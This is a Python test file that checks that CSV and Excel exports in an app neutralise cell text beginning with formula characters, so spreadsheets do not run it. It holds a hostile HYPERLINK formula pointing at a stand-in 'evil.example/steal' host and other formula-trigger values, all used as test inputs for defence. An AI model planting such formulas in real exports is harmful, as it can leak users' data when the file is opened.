"""
Exported files must not run code when opened in a spreadsheet program (app/core/export_safety.py).

Text that people typed (file names, review notes, names, anything an audit entry quotes) reaches the CSV and Excel exports. A cell that begins with `=`, `+`, `-`
or `@` is a FORMULA to Excel and LibreOffice. A load-test-style review of the code found no handling of this, so these tests pin it down: the helper on awkward
values, then each export with a hostile value in it.
"""
import csv
import io

import pytest

from app.core.export_safety import csv_safe, csv_safe_row, needs_neutralising
from app.models.models import RiskAdvisoryNote, RiskLevel, RoleEnum, Submission
from app.services.audit_service import record_audit
from tests.conftest import auth_header, login, make_user
from tests.test_upload_and_workflow import VALID_ROW, _setup_institution_user, _upload

HOSTILE = '=HYPERLINK("http://evil.example/steal","click")'


# ------------------------------------------------------------------ the helper
@pytest.mark.parametrize("value", [HOSTILE, "+SUM(A1:A9)", "-2+3", "@cmd", "\t=1+1", "\r=1+1", "=1+1", "--1", "+-1", "-"])
def test_text_that_could_be_a_formula_gets_an_apostrophe_in_a_csv(value):
    assert needs_neutralising(value) and csv_safe(value) == "'" + value


@pytest.mark.parametrize("value", ["Dodoma", "plain text", "", " =1+1", "12-3", "a=b", "Kwa Mchina"])
def test_ordinary_text_is_left_alone(value):
    assert csv_safe(value) == value


@pytest.mark.parametrize("value", ["-12.5", "+255", "1e5", "-.5", "5.", "0", "-7"])
def test_text_that_is_only_a_number_is_left_alone_so_figures_stay_readable_by_other_programs(value):
    assert not needs_neutralising(value) and csv_safe(value) == value


@pytest.mark.parametrize("value", [None, 5, 2.5, -7, 0, True])
def test_numbers_and_empty_values_are_never_touched(value):
    assert csv_safe(value) is value or csv_safe(value) == value


def test_a_row_is_handled_cell_by_cell():
    assert csv_safe_row(["ok", "=1+1", 3, None, "@x"]) == ["ok", "'=1+1", 3, None, "'@x"]


# ------------------------------------------------------------------ the exports
def _cells(csv_text):
    return [cell for row in csv.reader(io.StringIO(csv_text)) for cell in row]


def test_the_audit_log_export_neutralises_text_in_an_entry(client, db_session):
    make_user(db_session, role=RoleEnum.SYSTEM_ADMIN, username="admin_x")
    record_audit(db_session, None, "TEST_ACTION", "User", "abc", HOSTILE)
    token = login(client, "admin_x").json()["access_token"]
    res = client.get("/api/audit-logs/export.csv", headers=auth_header(token))
    assert res.status_code == 200
    row = next(r for r in csv.reader(io.StringIO(res.text)) if len(r) > 2 and r[2] == "TEST_ACTION")
    assert row[5] == "'" + HOSTILE
    assert not any(c.startswith(("=", "+", "@")) for c in _cells(res.text))


def test_the_submission_history_export_neutralises_a_file_name_and_a_review_note(client, db_session):
    _setup_institution_user(db_session)
    token = login(client, "inst_user").json()["access_token"]
    body = _upload(client, token, [dict(VALID_ROW, loan_id="LN-1", customer_id="C-1")]).json()
    submission = db_session.get(Submission, body["id"])
    submission.file_name, submission.review_notes = "=2+2.xlsx", "@SUM(1)"
    db_session.commit()
    res = client.get("/api/submissions/export.csv", headers=auth_header(token))
    assert res.status_code == 200
    row = list(csv.reader(io.StringIO(res.text)))[1]
    assert row[0] == "'=2+2.xlsx" and row[6] == "'@SUM(1)"


def test_the_combined_exposure_export_keeps_its_figures_as_they_were(client, db_session):
    make_user(db_session, role=RoleEnum.BOT_USER, username="analyst_x")
    token = login(client, "analyst_x").json()["access_token"]
    res = client.get("/api/reports/combined-exposure.csv", headers=auth_header(token))
    assert res.status_code == 200 and res.text.startswith("region,reporting_period,")


def test_the_excel_summary_stores_text_that_looks_like_a_formula_as_text_not_as_a_formula(client, db_session):
    from openpyxl import load_workbook
    analyst = make_user(db_session, role=RoleEnum.BOT_USER, username="analyst_y")
    db_session.add(RiskAdvisoryNote(title="=1+1", region=None, risk_level=RiskLevel.LOW, narrative="@x", recommendation="+y", created_by_user_id=analyst.id))
    db_session.commit()
    token = login(client, "analyst_y").json()["access_token"]
    res = client.get("/api/reports/summary.xlsx", headers=auth_header(token))
    assert res.status_code == 200
    wb = load_workbook(io.BytesIO(res.content))
    cell = wb["Risk Advisory Reports"].cell(row=2, column=1)
    assert cell.value == "=1+1" and cell.data_type == "s"                  # the words are as typed, and Excel is told they are text
    assert all(c.data_type != "f" for ws in wb for row in ws.iter_rows() for c in row)   # no formula cell anywhere in the workbook
